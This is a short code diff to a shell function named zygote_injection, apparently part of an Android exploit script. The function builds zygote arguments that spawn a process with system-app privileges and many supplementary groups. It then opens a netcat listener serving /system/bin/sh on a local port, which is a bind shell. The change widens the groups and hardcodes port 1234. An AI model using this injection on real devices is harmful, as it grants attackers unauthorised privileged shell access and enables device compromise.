@@ -112,11 +112,11 @@ zygote_injection() {
 --setgid=1000
 --runtime-flags=2049
 --mount-external-full
---setgroups=3003
+--setgroups=1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1018,1021,1023,1024,1032,1065,3001,3002,3003,3006,3007,3009,3010
 --nice-name=runnetcat
 --seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete
 --invoke-with
-toybox nc -s 127.0.0.1 -p %s -L /system/bin/sh -l;
+toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;
 "\n' "$uid" "$uid" "$NC_PORT"
 }
 
